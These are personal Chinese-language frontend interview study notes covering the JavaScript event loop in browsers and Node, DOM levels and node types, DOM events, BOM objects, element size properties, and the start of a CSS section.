切记：不要一问一答，善于沟通。不要被动的回答问题，可以将知识延伸，聊到自己擅长的领地
自己的职业规划：认真想想，已3-5年为界	
想想最后问面试官的问题		

						 浏览器渲染过程

一、Event loop -- Js 执行环境有 node 和 浏览器的区别 [很重要!!]

    因为 Js 设计之初就是一门单线程语言，所以为了实现主线程的不阻塞，Event Loop 这样的方案应运而生
    
    js 单线程的原因：
        假定 Js 同时有两个线程，一个线程在某个 dom 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？
    
    
   0. 微任务 > 宏任务
   同一次事件循环中，微任务永远在宏任务之前执行
   
    task 主要包含：setTimeout、setInterval、ajax、UI交互事件 (https://segmentfault.com/a/1190000004293163)、setImmediate（node）
    
    microtask 主要包含：Promise、process.nextTick
    
    
    1. node 环境下事件循坏机制
       事件循坏状态与浏览器大致相同，不同的是node中有一套自己的模型。
    
    	(1) node 依靠的libuv引擎 [事件循环存在于libuv线程池中]
    
          node选择chrome v8引擎作为js解释器，v8引擎将js代码分析后去调用对应的node api，而这些api最后则由libuv引擎驱动，
	  执行对应的任务，并把不同的事件放在不同的队列中等待主线程执行。

    	(2) libuv 引擎中的事件循环的模型: 每个方块代表事件循坏的一个阶段	

		     ┌─>│        timers      -->    执行定时器队列中的回调 setTimeout() 和 setInterval()
		│  └──────────┬────────────┘
		│  ┌──────────┴────────────┐
		│  │     I/O callbacks     │ -->    执行几乎所有的回调 [!!不包括close事件，定时器和 setImmediate()的回调]
		│  └──────────┬────────────┘
		│  ┌──────────┴────────────┐
		│  │     idle, prepare     │ -->    闲置阶段
		│  └──────────┬────────────┘      ┌───────────────┐
		│  ┌──────────┴────────────┐      │   incoming:   │
		│  │         poll          │<──connections───     │ -->    等待新的I/O事件
		│  └──────────┬────────────┘      │   data, etc.  │
		│  ┌──────────┴────────────┐      └───────────────┘
		│  │        check          │ -->    执行 setImmediate() 回调
		│  └──────────┬────────────┘
		│  ┌──────────┴────────────┐
		└──┤    close callbacks    │
		   └───────────────────────┘


    
    	(3) 事件循坏的过程：
    
	      外部输入数据-->轮询阶段(poll)-->检查阶段(check)-->关闭事件回调阶段(close callback)-->
	      定时器检测阶段(timer)-->I/O事件回调阶段(I/O callbacks)-->闲置阶段(idle, prepare)-->轮询阶段...
      
      
    	    代码进入 libuv 引擎：  
      
	      (1) poll 阶段 -- v8 解析代码传入libuv后
		    先查看poll queue中是否有事件，有任务就按先进先出的顺序依次执行回调

		    queue 为空时, a,b ...两者的顺序是不固定的，收到代码运行的环境的影响.如果两者的queue都是空的，那么loop会在poll阶段停留，
		    等待新的 I/O 事件

		      a. 检查 setImmediate queue，有进入 check 阶段
		      b. 同时也会检查 timer queue，有进入 timer 阶段

		    poll queue中的回调时实际上不会无限的执行下去

		      a. 所有回调执行完毕
		      b. 执行数超过了node的限制

	      (2) check [poll queue 空闲，且 setImmediate queue 中 有 callback 时]

	      (3) close阶段
		    当一个socket连接或者一个handle被突然关闭时（例如调用了socket.destroy()方法
		    close事件会被发送到这个阶段执行回调。否则事件会用 process.nextTick（）方法发送出去		  

	      (4) timer阶段 [poll queue 空闲，并且 timer queue 中 有 callback 时]

	      (5) I/O callback阶段
		    主要执行大部分I/O事件的回调，eg：一个TCP连接生错误时，系统需要执行回调来获得这个错误的报告
	    

    	(4) process.nextTick, setTimeout 与 setImmediate 区别

	      (1) process.nextTick()
		    node 中存在着一个特殊的队列，即 nextTick queue，每一个阶段执行完毕准备进入下一个阶段时优先执行 callback 回调

		    与执行poll queue中的任务不同，这个操作在队列清空前是不会停止的
		      错误的使用process.nextTick()方法会导致node进入一个死循环。。直到内存泄漏


	      (2) setTimeout() 和 setImmediate()

		    setTimeout：仅表示最早多少时间以后会执行
		    setImmediate：poll阶段后这个固定的时间段执行的回调 （应该与 process.nextTick() 换名，两者才是最匹配的hahaha）


			setTimeout()和不设置时间间隔的setImmediate()表现上及其相似。猜猜下面这段代码的结果是什么？
			
			setTimeout(() => {
			    console.log('timeout');
			}, 0);

			setImmediate(() => {
			    console.log('immediate');
			});

		输出取决于这段代码的运行环境 <- [因为计时要受线程的性能影响，而线程又收到程序运行环境的影响。最终的结果就是不确定]，
		但是在I/O事件的回调中，setImmediate方法的回调永远在timer的回调前执行
		
    
    2. 浏览器多线程
       事件触发器、AJAX、定时器线程
       
         线程的联系都是基于事件的。js 引擎处理到与其他线程相关的代码,就会分发给其他线程, js 并不会阻塞。他们处理完之后,就会在任务队列中添加一个事件	    回调。这就是 js 的异步编程模型 ---> 执行上下文栈与事件队列
          

        
       	(1) 事件循坏的过程：
    
		1. 可执行代码

		     全局代码、函数代码、eval 代码

		2. Js 引擎遇到可执行代码
		   创建一个执行上下文，并且压入执行上下文栈，函数执行完毕就弹出

		      因为单线程的原因，同一时间只能执行一个方法，于是这些方法被排在一个单独的地方 -> 称为执行上下文栈，未完待续
			

	     伪代码：
		ECStack.push(<funcScopeContext> functionContext)/*执行到函数func*/

		ECStack = [
		    funcScopeContext,
		    globalContext // 在应用程序结束前，ECStack 最底部永远有个 globalContext [模块化命名空间]
		];

		ECStack.pop()/*执行完毕*/
	
     
		3. 工作原理：
		   [静态分析时：立即执行函数、变量提升、import]

		     Js 引擎并非一行行的分析执行程序，而是一段段的分析执行，当执行到一段 code 的时候，就会进行一个"准备工作 ",专业一点就叫做 		     "执行上下文"


		     (1) 执行一个函数的时候，就会创建一个执行上下文，并且压入执行上下文栈，当函数执行完毕的时候，就会将函数的执行上下文从栈中弹			     出。除非栈溢出，否则这个过程可以一直进行下去。
			 
       
     
       	(2) 那么异步代码的执行过程呢？

	       a. 当异步事件返回结果后，js会将这个事件加入与当前执行栈不同的地方 -> 事件队列

	       b. 等待当前执行栈中的所有任务都执行完毕， 主线程处于闲置状态时，主线程会去查找事件队列是否有任务。

	       c. 如果有，那么主线程会从中取出排在第一位的事件，并把这个事件对应的回调放入执行栈中，然后执行其中的同步代码...，如此反复，
		  这样就形成了一个无限的循环
       

   3. 微任务 > 宏任务
      同一次事件循环中，微任务永远在宏任务之前执行
   
    	task 主要包含：
      	  setTimeout、setInterval、ajax、UI交互事件 (https://segmentfault.com/a/1190000004293163)、setImmediate（node）
    
    	microtask 主要包含：
    	  Promise、process.nextTick（process.nextTick(callback)类似node.js版的"setTimeout"）
	  
   
	举个栗子：    
	    console.log(1)
										答案：
	    setTimeout(() => {						1.同步运行的代码首先输出：1、7
		console.log(2)
		new Promise(resolve => {				2.接着，清空microtask队列：8
		    console.log(4)
		    resolve()						3.第一个task执行：2、4
		}).then(() => {						
		    console.log(5)					4.接着，清空microtask队列：5
		})
	    })								5.第二个task执行：9、11

	    new Promise(resolve => {					6.接着，清空microtask队列：12
		console.log(7)
		resolve()
	    }).then(() => {
		console.log(8)
	    })

	    setTimeout(() => {
		console.log(9)
		new Promise(resolve => {
		    console.log(11)
		    resolve()
		}).then(() => {
		    console.log(12)
		})
	    })
	
     
    
   3. setTimeout 和 setInterval 的机制
      仅表示最少多长时间后会执行
      
       	(1) 定时器线程
	
	      定时器线程处理完之后，会向 task 任务队列添加一个事件回调，等到执行上下文栈执行完毕。
	
	
	   API：var tId = window.setTimeout(function[, delay, [, param1, ..., paramn]])
	        参数：
		function：回调函数
		delay：延迟
		param1：回调实参
		
		clearTimeout(tId) /*此时tId仍在内存中*/
    
       	(2) setTimeout(f, 0)
            将任务放到浏览器最早可得的空闲时段执行
	
	
       	(3) setTimeout 累计效应：
            开发时最好不要用：setInterVal(doStuff, 100); // 虽然精确隔一段执行
	    
	      1）某些间隔会被跳过;  2）多个定时器代码之间的间隔可能会比预期的小  https://juejin.im/entry/58b253c6ac502e0069d5e4d9/

		function tick() {
		    doStuff(); // 误差为 doStuff() 执行时间
		    setTimeout(tick, 100);
		}
		tick();			
    
       	(4) window.requestAnimationFrame
	    h5 提供专门用于请求动画的 API，与 setTimeout 机制相同
	
	
	    cancelAnimationFrame()/*清除定时器*/

		  1. 实现动画的效果
		     js：setTimeout
		     css3：transition 和 animation
		     h5：canvas

		  2. 系统决定回调时机「显示器刷新频率」

		     (1)解决丢帧和过度渲染
		     (2)能保证回调函数在屏幕每一次刷新间隔中只被执行一次，动画也就不会卡顿「函数节流的效果」
	     
    
    
    						DOM基础
						
						
  0. 为什么我们需要 DOM？
     我们可以通过 BOM 对象（browser object model）来进行交互
     
       window、navigator(浏览器与系统信息)、screen、history、!cookie
       
       但这个通过 BOM 来实现的交互远远不够。要实现页面的动态交互和效果，操作 html 才是核心  <-- DOM

    
  1. 文档的发展历史
      * html(hyper): 显示数据并集中于数据外观
      * XML(extensible): 主要用于存储数据和结构，可扩展
     
     DOM 0级 与 DHTML
     
         (1) 规范

	       * JavaScript 早期版本中提供访问和修改文档的 API
	       * 事件处理程序 [第四代浏览器中出现]
	       
	       栗子：
	           document.images[0] // 第一张图片
	           document.forms['user'] // 名为 'user' 表单
       
       
         (2) 概念
	 
	       在阅读 DOM 标准的时候，经常会看到 DOM0 这样的字眼，实际上 DOM0级 这个标准是不存在的，还处于未形成标准的初期阶段。所谓  		       DOM0级 只是 DOM 历史坐标系中的一个参照点而已
	       
	       --> 具体地说 DOM0级 就是指 IE4.0 和 Netscape navigator4.0 最初支持的那个 DHTML。
	       
         (3) 目标
	       
	       因为没有规范和标准，两种浏览器的实现并不完全一样，为了兼容性考虑需要写大量的代码
       
     
     
     DOM 1级
     
         (1) 规范
	 
	         * DOM CORE：规定如何映射 XML 的文档结构，以便简化对文档中任意部分的访问和操作
	         * DOM HTML：在 DOM CORE 的基础上加以扩展，添加了针对 HTML 的对象（Element）和方法
		 
         (2) 概念
	 
	       w3c 结合大家的标准推出了标准化的 DOM [!重点 与平台和编程语言无关的接口]，通过 API 脚本可以动态的访问和修改文档
	       的内容、结构和样式。

	       
         (4) 目标
	 
	       主要映射 HTML 文档的结构
	       
	       * 什么是文档结构？
	       
	          1. DOM 可以将任何 html 与 xml 文档描绘成一棵有有多层结点的树
		  2. 节点为不同的类型 --继承--> Node 接口 [分别表示了文档中不同的信息及标记]
		  3. 每个节点都拥有各自的特点、数据和方法，另外也与其他节点存在某种关系
         
     
     
     DOM2 级
     
         (1) 规范
	 
	         * DOM事件（DOM Events）：定义了事件和事件处理的接口
		 * DOM样式（DOM Style）：定义了基于CSS为元素应用样式的接口
		 
		 * DOM遍历（DOM Traversal）：辅助完成顺序遍历 DOM 结构 [深度优先]
		    
		      * NodeIterator(root) [root 为搜索起点]
		         a. filter 对象 [配置筛选函数]
		         b. 返回对象有一个内部指针指向其根节点
		         c. next/previousNode()
		 
		 * 范围（ DOM Range）：定义了操作文档的区域
		 
		      * document.createRange()
		         a. container: 范围起点（start）的父节点  offset: 起点在父节点偏移量
	                 b. selectNode(start)
			 c. setStart(container, offset)
	 
         (2) 概念
	 
	       在 DOM1 的基础上 DOM2 引入了更多的交互能力，将 DOM 划分为了更多具有联系的模块，又扩充了鼠标、用户界面事件、范围、遍历
	       等细分模块，并且增加了操作css的 API
	       
         (3) css API
	 
		   1) html 中的定义样式
		        
			* 外部样式表：<link>
			* 嵌入样式表：<style>
			* 内联样式
		   
		   2) CSS API
		   
			* element.style [内联样式]
			
			   属性：
			     * style.cssText [样式中的 css 代码]
			     
			   方法：
			   
			     * getPropertyValue(propName) // 字符串
			     * setProperty(propName, value, priority) [priority: "!important" || ""]
			     
			     * removeProperty(propName)
			
			
			* window.getComputedStyle(element, [pseudoElt]) [计算样式 ]
			
			   * IE: element.style.currentStyle
			   
			   
			* 样式表
			
			   * element.sheet or docuemnt.styleSheets
			   
			      属性： 
			        * href: <link> 样式表的 href
			     
			        * media: 支持所有媒体类型
			     
			        * ownerNode: 拥有当前样式表节点
			        * ownerRule: 指向 @import 样式表的指针
				
			        * cssRules: 样式规则合集
			     
			          栗子：
				      html { margin: 0;} // cssRules[0]
			  	      body {padding: 0;} // cssRules[1]
				      
			      方法： 
			        * insertRule(rule, idx) [IE: addRule()]
				
			        * deleteRule(idx)
			   
       
       
		       onchange： input失去焦点触发
		       oninput：要在用户输入触发 [元素值发生变化时立即触发]
       
       
		 DOM2 用户界面事件: 不一定与用户操作有关	      
       
		   (1) load: 
		   
		         * window.load：
			 
			     * 页面完全加载 [包括图像、Js、css等外部资源] 
			     * event.target = document
			     
			     * DOM0级 onload 使用 <body> 代理 [无法访问 window 元素] 
		
		
		         * img.load
			 
			     * event.target = <img>
			     
			     1) Image 对象
			     
			     	* 在 DOM 出现前，用 Image 对象在客户端预加载图像
			     	* 无法添加到 dom树 中
				
				demo: 
				     var img = new Image()
				     img.src = 'http://cdn.com/img'
			     
			 
		         * 预加载图像原理 [!重点：设置 img.src 属性就开始下载]
			 
			    * img 添加到 dom树 前就会开始下载 
			    
			    * <script>、<link> 需要添加到 dom树 中才会下载
		
		    
		         * script.load: 非标准

	        
		   (2) 高频触发事件 [被触发的频次非常高，间隔很近]
		       
		         * window.resize：
			 
			     * 窗口被调整为新高度和宽度时，就会触发 resize 事件
			 
			 * window.scroll：
			 
			  应用场景：
			     * 用户体验之平滑滚动
			     
			     	  1) 掉帧
				  
				       如果事件中涉及到大量的位置计算、DOM 操作、元素重绘等工作且这些工作无法在下一个 scroll 事件触发前完					       成，就会造成浏览器掉帧
				     
			     	  2) 连续的滚动
				  
				       加上滚动往往是连续的，会持续触发 scroll 事件导致掉帧扩大、浏览器 CPU 使用率增加、用户体验受到影响
	            
			 
			     * 在滚动事件中绑定回调应用场景：图片的懒加载、下滑自动加载数据、侧边浮动导航栏等
			     
			     
			  solve：
			     * 防抖和节流
			     * requestAnimationFrame
			     
				     栗子：状态机

					var ticking = false;

					function onScroll() {
					    if (!ticking) {
						requestAnimationFrame(realFunc);
						ticking = true;
					    }
					}

					function realFunc() {
					    // do something...
					    ticking = false;
					}
					// 滚动事件监听
					window.addEventListener('scroll', onScroll, false);


			     * 优化事件的 handler
	                       上述方法都是优化 scroll 事件的触发，从本质上讲，我们还是应该精简 scroll 事件的 handler
		   
			     	  1) 避免 scroll 事件中修改样式

	
		 DOM2 焦点: blur focus
       
       
		 DOM2 鼠标: MouseEvent
       
		    (1) 事件流：mousedown -> mouseup -> click
			 
		         * mouseenter/leave
			     * 不冒泡
			 
		         * mousemove
			     * 在元素内重复移动 
	 
		         * mouseover/out
			     * 指针位于一元素上方，移入/出另一元素触发 			 
			     * event.relatedTarget: 鼠标移入的元素 [只有这两个事件才包含的值]
	     
	 
			        栗子：ul 中包含 li，在 ul 中移动，若移动到 li 边界频繁触发
       
			          1) 用 mousemove 模拟 mouseenter 事件
				  
				       * 鼠标不是在元素内部移动
				       
				           event.relatedTarget !== target(目标元素) 
					   
				       * 不是目标元素的子元素
				       
				       	    var b = event.relatedTarget
					    
					    while ((b = b.parentNode) && b.nodeName !== ''){
						 if (b === target){  
						     return true;  
						 }  
					    }
       
       
		    (2) event
	                鼠标事件都是在浏览器中特定位置发生的
		  
		         * 视口位置 
			     * event.clientX/Y
		    
		         * 页面位置 [在页面未滚动的情况下，pageX = clientX]
			 
			     * event.pageX/Y
			     * hack：pageX = clientX + document.body.scrollLeft
       
		         * 屏幕位置
			     * event.screenX/Y
		    
		    
		 DOM2 H5事件
       
		         * DOMContentLoaded
	 
		         * readystatechange
	 
		         * hashchange：hash 变化
	 
	 
		 DOM2 移动设备：
	 
		         * orientationchange：切换横纵屏
	 
	 
		 DOM2 触摸事件
		 
		    (1) 事件流：touchstart ->
		               mouseover -> mousemove -> mousedown -> mouseup --> click ->
			       touchmove（未移动不触发） --> touchend
			       
			       
		         * 触摸屏幕触发：touchstart
			 
		         * 连续滑动：touchmove
			 
		         * 移开屏幕：touchend
 
	   
		    (2) event [类似鼠标的 event 属性]
	   
       
       
		 DOM2 范围: 操作 dom 树中某个范围的对象
		 
		 DOM2 遍历: 遍历 dom 树的方法
      
      DOM3
        进一步扩展 DOM，引入了以统一方式加载和保存文档的方法（DOM Load And Save 模块），同时新增了验证文档的方法（DOM Validation）
     
     (1) DOM API
     	   DOM（文档对象模型）是针对 xml 经过扩展用于 html 的应用程序编程接口，我们又叫 API
	   
     	   DOM 把整个页面映射为一个多层的节点结构，html 页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据和方法
     
     
     (2) Node 接口
     	 DOM1级 定义了一个 Node 接口，在 js 中是作为 Node 类型来实现的 [除 IE 外所有浏览器都可以访问该类型][IE 未开源]
	 
	 
	 * Node.nodeName：元素大小标签名、属性名
	   Element.tagName [逻辑更清晰..]
	 
	 * Node.nodeValue：属性的值、文本与注释的内容
	 
	 * Node.nodeType [数值常量或者字符常量]
	   IE 没有公开 Node 类型构造函数，最好还是与数值访问
	  
			节点类型 | nodeType
			------------ | -------------
			Element  | 1
			Attr     | 2
			Text     | 3
			Document | 9
			DocumentFragment | 11


     (3) Element 继承：
	     关键：[null 值判断]
	     
	     a. 节点关系
	 
	           * parentNode：指定节点在 DOM 树父节点 [Element、Document or DocumentFragment]

	           * firstChild：节点在 DOM 树中第一个子节点
	           * lastChild：..最后一个子节点

	           * childNodes：指定节点的子节点的集合(live)

	           * nextSibling/previousSibling：父节点 childNodes 中紧跟的兄弟节点
	     
	           * ownerDocument：指向整个文档的文档节点
		   
		   
	     b. 操作节点
	 
	           * appendChlid()：childNodes 末尾添加结点 [已存在的 dom 树中节点 -> 位置改变]

	           * insertBefore(newNode, referenceNode)：newNode 变为 referenceNode.previousSibling

	           * replaceChild(newChild, oldChild)
		     原理：newChild copy 所有 oldChild 的指针 [被替换节点仍然在文档中，只是没有了自己的位置]

	           * removeChild(child)：原理同 replaceChild
		     栗子：
		     
		       let oldChild = node.removeChild(child); // 使用变量保存节点的引用，否则下述方法会被垃圾回收

		       element.removeChild(child);
	     
	           * ownerDocument：指向整个文档的文档节点
			
	 
	 1) 节点类型
	    Js 中所有节点类型都继承 Node 类型，下面是常用的 7 种类型
	    
    
	      1. Element（元素结点） [ html 中的元素。通常元素有 1.子元素 2.文本节点 ]

	      
		 * DOM3 Node.textContent [节点及其后代的文本内容]
		 
		 * el.children [与 childNodes 区别是只包含 Element 节点]

		 * h5 el.innerHTML [元素包含的HTML代码]
		
		      1）仅建议创建新节点且内容可控 { 最好不是用户输入、没有标签 }
		      2）重新 parse 设置整个 html（一些样式、事件消失）「事件代理」
			  a. 内存泄漏「绑定事件消失」
			  b. 安全问题「用户输入 hack」
		    
		    
		 * outerHTML [包括自身HTML代码]
		  
		  设置 innerHTML / outerHTML 时，就会创建一个html 解析器 [在浏览器级别 c++ 代码] 上运行，效率会比 Js 高很多，
		  不可避免的，create、destory html parser 也会带来性能损失，最好构建好字符串一次赋值

		 
		 * h5 classList [替代 className] -- 操作局部 class 属性
		 
		    * 属性：el.classList.length
		    * 方法：el.classList.add/remove...() 
		   
		
		  (1) 所有 html 元素继承 HTMLElement
		   
		         * id
		         * title: 提示信息
			 
		         * lang

			 * className [重要]
			   字符串, 增删改类名, 都需要对字符串整体替换
			   
			 * innerText [节点和所有后代节点的文本内容]
			 textContent 后背属性
			 
			 

		        2) 样式
			
			 * style [内联 style 属性]
			     * el.style(.color) // 只读对象，通过对象属性改变样式
			     * el.cssText = ''
			 
			 * 只读
			   window.getComputedStyle(element, [pseudoElt])
			   === element.currentStyle
			   
			 * element.styleSheet [样式表]
			   * cssRules -- 样式表中的每一条规则


		      
		  (2) 属性操作
		      也可以通过 DOM 元素本身属性访问 [只有公认属性]
		      
		         * attributes [ NamedNodeMap - alive ]
			   常用于遍历属性 -- [{nodeName: nodeValue}, ..]
		      
		         * element.get/setAttribute() [一般用于自定义属性]
		         * element.removeAttribute()
			 
			 * nodeList = element.querySelectorAll(selector) [快照]
			 
			 
		  (3) 创建元素：
			 * document.createElement(tagName)
			 
			 * element.getElementsByTagName [搜索起点是当前元素]



	      2. Attr（属性结点） [element.attributes]
	         元素节点的一部分，并不单独出现于 dom 树


	      3. Text（文本结点） [纯文本内容]
		 只包含文本内容的节点（元素 / 属性的文本内容）
		  
		 * document.createTextNode()
		 
		 * element.normalize() [合并相邻文本节点]
		 相邻文本节点：浏览器在解析时永远不会显示相邻文本节点，这只会作为 DOM 操作结果出现
		 
		      // 节点有两个相邻文本节点
		      element.firstChild.nodeValue
		      element.lastChild.nodeValue
		 
		  
	      4. Comment
	         表示注释的内容 <!-- 注释 -->


	      5. Document（文档结点）
	         表示文档
		 
		   1. document对象 是 HTMLDocument（继承了 Document）的一个实例，是文档中其他所有节点的父节点
		      <!DOCTYPE html>、<html> 均是文档节点子节点
		   
		   2. window 对象属性 [作为全局对象访问]
		  
		      每个文档都有自己的 document 对象，浏览器载入 html 文档就存在了
		      
		  
		  (1) 文档的子节点
		      Document 子节点：可以是 Element、Comment、DocumentType
		      
		         * document.documentElement：<html>
		         * document.doctype：<!DOCTYPE html>，浏览器支持差别大 [是否作为 d.childNodes 第一个子节点 (IE yes)]
			 
		         * document.cookie

			 * h5 document.body
			 * h5 document.head： <head>
			 

		         * document.childNodes：Node.childNodes // 返回当前节点的所有子节点
			 
			 
		  (2) 获取元素：
			 * Element = d.getElementById(id) [匹配文档中第一次出现元素]
			 
			 * HTMLCollection = d.getElementsByTagName(tagName) [alive]
			 
			 * NodeList =  getElementsByClassName [alive]
			 
			 * nodeList = d.querySelectorAll(selector) [快照]
		      
		      
		      
		  (3) 作为 HTMLDocument 实例，还有一个 title、domain、referrer、url
		      
		         * document.title：<title> 文本
			 
		         * document.domain、url、referrer 
			   HTTP 请求头部信息
			   -> 1. 文档 [域名, url, 链接到当前页面的页面 url] 2. 只能设置 domain
			 
		  
		  
		   (4) 获取 document
		       window.document = iframe.contentDocument = xhr.responseXML = Element.ownerDocument
		       
		   (5) 样式
		   
		         * document.styleSheets
		   


		    h5 事件
		    
			   a. d.DOMcontentLoad：形成完整的 dom 树之后就触发

			       window.onload 的弊端：
				  当页面中有大量远程图片或要请求的远程资源时，我们需要让js在点击每张图片时，进行相应的操作，如果此时外部资源
				  还没有加载完毕，点击图片是不会有任何反应的，大大降低了用户体验


		    
			   b. d.onreadyState：
			       * loading: 正在解析 html 文档
			        * interactive: 加载外部资源 --- DOMContentLoaded
			         * complete: 加载完成 --- window.onload 即将触发

		  
	      6. DocumentType（文档类型结点）
		 每一个文档结点都有一个 DocumentType 属性, 它的值或者是null，或者是 DocumentType 对象
		  
		  (1) <!DOCTYPE html> 
		
			 h5没有该区别，尽量实现向后兼容: <!DOCTYPE html>
			  * 标准模式：w3c 的方式解析
			  * 混杂模式：自己的方式向后兼容老版本


	      7. DocumentFragment（文档片段结点）
	         是轻量级的或最小的Document对象，它表示文档的一部分或者是一段，不属于 dom 树
		 
		  (1) 插入 DocumentFragment 结点时，只插入它的所有子孙结点 [!可以作为占位符，暂时存放一次插入文档的节点]
		 
			 栗子：
				var fragment = document.createDocumentFragment()

				// 如果不用文档片段，我们每次添加 li 浏览器都会反复的渲染
				for (var i = 0; i < k; i++) {
				    li = document.createElement('li')
				    li.appendChild(..)
				    fragment.appendChild(li)
				}
			
	      总结：
	      
		  1) DOM 的关键，就是理解 DOM 对性能的影响. DOM 操作往往是 Js 开销最大的部分，NodeList 导致的问题为最多
	      	     [NodeList 对象都是"动态的", 每次访问 NodeList 对象都会运行一次查询]，尽量减少 DOM 操作
	      
	      	     Virtual DOM...
	      
	      
	     
		  2) Nodelist、NamedNodeMap、HTMLCollection 都是动态的集合，文档结构变化时，会得到更新

	     	     for(let i = 0, len = nodelist.length; i > len; i++) {
		     	// 迭代一个 Nodelist，最好是使用 length 属性初始化第二个变量
		     }


     
     4. 重点来啦!!! DOMReady
     
     	html 要经过浏览器解析才能变成 DOM「浏览器是从上到下，从左向右渲染元素的」
        
	  事实上，我们在编写大型项目的时候，js文件往往非常多，而且之间会相互调用，大多数都是外部引用的，不把js代码直接写在页面上。
	  这样的话，如果有个domReady这个方法，我们想用它就调用，不管逻辑代码写在哪里，都是等到domReady之后去执行的。
	
	(1) window.onload
	      DOM 加载完毕，且所有请求资源「图片、脚本、iframe等」也加载完毕触发事件
	      
	      缺点：当页面中有大量远程图片或要请求的远程资源时，我们需要让 js 在点击每张图片时，进行相应的操作，
	      如果此时外部资源还没有加载完毕，点击图片是不会有任何反应的，大大降低了用户体验。

	
	(2) DOMContentLoaded
	      onload 事件是要在所有请求都完成之后才执行，而 domReady 在加载完 dom 树之后就能执行「更早的执行时间」
	      
	      Jquery：$(function(){})
	         是 $(document).ready(function(){}) 的简写
		
	
	(3) DOM 继承与嵌套
	    Vue 虚拟 DOM 的概念
	      DOM节点是一个非常复杂的东西，对它的每一个属性的访问，不走运的话，就可能会向上溯寻到N多个原型链，因此DOM操作是个非常耗性能的操作
	    
	        function HTMLParagraphElement() { 
		    [native code] 
		}

		document.createElement("p")=new HTMLParagraphElement('p');
	    
	    继承链：HTMLParagraphElement -> HTMLElement -> Element -> Node -> EventTarget -> Function -> Object
	    
	 
	 (4) HTML 嵌套规则「不按规则属性浏览器可能解析不正确」
	 
	    1) 块元素可以包含内联元素或某些块元素，但内联元素却不能包含块元素（只能包含内联元素）
		<div>
		  <h1></h1>
		  <p></p>
		</div>
		<a href="#"><span></span></a>

	    2) 不能再包含块级元素的块元素
		h1、h2、 h3、h4、 h5、 h6、 p 、dt

	    3) li标签可以包含div标签
		<li>
		  <div></div>
		</li>

	    4) 块级元素与块级元素并列，内联元素与内联元素并列
		<div>
		  <h2></h2>
		  <p></p>
		</div>
		<div><a href="#"></a><span></span></div>
		
		
	
		
		
    						BOM
						
   常用全局函数：isFinite()、isNaN()、parseFloat()、parseInt()、编(解)码url
   
   全局对象：是作用域链的头呐
     预定义的对象，且可以访问所有其他所有预定义的对象（所有 WebAPIs）、函数和属性
						
一：常用的 BOM 对象属性

     URL 的构成：
	<protocol>://<host>「<hostname>:<port>」/<pathname>?<query>#<hash>

	1. 获取 location 对象「window/document.location」

	    URL 各个构成部分都可以通过对应名称获取「protocol、host、hostname、port、pathname、hash」
	    
	    location.href-- 当前文档的URL
	    location.search -- 返回URL中包括(?)后面的内容

	    location.assign(str) -- 设置当前文档的URL
	    location.replace(str) -- 设置当前文档的URL，并且在history对象的地址列表中移除这个URL「应用：跳转移动版网页」
	    location.reload() -- 重载当前页面「f5」

	2. window.history 

	    history.go(num) -- 前进或后退指定的页面数 
	    history.back() -- 后退一页 
	    history.forward() -- 前进一页

	3. window.navigator「包含浏览器和系统信息」/screen

	    navigator.userAgent -- 返回用户代理头的字符串表示(就是包括浏览器版本信息等的字符串) 
	    navigator.cookieEnabled -- 返回浏览器是否支持(启用)cookie

	    screen.height/width -- 窗口宽高
	    screen.availHeight/availWidth -- 窗口可用宽高
	
		    
	5. window: 当前浏览器窗口
	
	  1. 常用属性
	  
	      window.name -- 即在一个窗口(window)的生命周期内,所有 window 对象（ <iframe> 载入的所有页面 ）
	      都是共享一个 window.name 的，每个页面都有 window.name 读写的权限

	      window.self/window === window
	      window.devicePixelRatio -- 设备像素比

	  2.距离位置属性
	  
	      innerWidth /*重要!!viewport*/

	      scrollX/Y (别名：pageOffset) // !!「页面」滚动px


	    (3) 滚动文档
	    
	      scrollTo(options)
	      options: {
		top: y / left: x /*坐标*/
		behavior: auto('instant') | 'smooth'
	      }
	      scrollBy(offsetRight, offsetBottom) /*距离*/

	    (4) 实际样式值
	    
	        window.getComputedStyle(element[,pseudoElt--伪元素])


						
						
						
    
   						 DOM元素大小
	   
	        		    
	
	1. 尺寸属性
	   
	   
	    (1) offest：偏移量
	        元素在屏幕上占用的所有可见空间
		
		可见空间：由元素的width、height [盒子模型] 决定，包括所有内边距、滚动条和边框 [不包括外边距]
	     
	
	 	 1）offsetTop, offsetLeft（只读）
		    元素对于 offsetParent 的偏移 [offsetParent：最近定位包含块（position 不为 static]
	       
	    	       * offsetHeight/Width（只读）：元素高度 
	     
	    	       * offsetHeight = 标准盒子模型height + padding + border
		       
		       栗子：
			       
				var left = element.offsetLeft // 某个元素在页面的偏移量
				
				while ((element = element.offsetParent) !== null) {
				    left += parent.offsetLeft // 累加至根元素
				}
				
	 	 2）避免重复访问，每次都需要重新计算 [局部变量缓存]
	  
	       
	    (2) 滚动大小
	       
	 	 1）scrollTop, scrollLeft：元素滚动像素数
	  
	       （元素的顶部到视口可见内容的顶部「<body>」的距离）--- 如果元素不能被滚动，则为0。	       
	       
	     
	 	 2）scrollHeight, scrollWidth（只读）：元素内容高度

	       （内容的整体尺寸，包括元素看不见的部分[需要滚动才能看见的]）--- 包括padding，但不包括margin和border
	  	    
	    
	    (3) clientHeight, clientWidth [内部空间]
	      * clientHeight = 标准盒子模型height + padding
	       
	  
	  
	  2）Element 方法
	    a. 常用于确定元素相对于视口的位置
	  
	      getBoundingClientRect() //返回一个 DOMRect 对象，包含：
	      
	        I.trbl：都是元素（不包括 margin）相对于 viewport 的距离。	
		
	        II.height =  scrollHeight + border
		     （元素的整体尺寸，包括被滚动隐藏的部分）




					
					css面试
					
link 与 @import的区别：
  1、<link> 是 html 标签，当然没有兼容性问题，@import 是 css2.1 引入的，可能会有一些古老机器的兼容性问题
  
  2、加载页面时 <link> 引入的 CSS 被同时加载；@import引入的 CSS 将在页面加载完毕后被加载（多个 link 或 多个@import 都是并发加载）
       @import 嵌套会导致串行下载：可能下载完成引入外部样式表后又解析到 @import
    
  3、可以通过 JS 操作 DOM ，插入 <link> 来改变样式；但 DOM 无法操作 @import 

					
一、层叠、优先级、继承
1. css选择器分类：
	   (1) 基本的：全局选择器（*）
	   
		E F：选择后代元素
		E > F：子元素
		E + F：只选择一个后续相邻元素 （css3 E ~ F：选择 E 之后所有兄弟元素）
		s1, s2, s2：多个选择器的组合
		
	   (2) 常用伪元素：
	   
	   	::after ::before：设置元素在dom 树结构前后发生的内容，与 content 属性一起使用（插入的内容都是匿名的可替换元素）
		
	   (3) 常用伪类：
	   
